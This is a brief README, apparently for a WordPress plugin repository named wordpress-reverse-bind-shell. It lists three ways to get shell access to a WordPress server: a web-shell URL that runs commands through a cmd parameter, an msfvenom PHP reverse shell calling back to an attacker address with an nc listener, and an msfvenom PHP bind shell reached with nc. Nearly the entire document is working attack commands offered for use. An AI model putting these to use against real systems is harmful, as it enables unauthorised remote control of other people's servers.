# wordpress-reverse-bind-shell

## 1st option
http://server.fun/wordpress/wp-content/plugins/wordpress-reverse-bind-shell/cmd.php?cmd=whoami

## 2nd option
msfvenom -p php/reverse_php -f raw  LHOST=172.16.1.1 LPORT=4444 -o reverse.php

nc -lvnp 4444

## 3rd option
msfvenom -p php/bind_php -f raw LPORT=4444 -o bind.php

nc server.fun 4444

## ToDo
More details...
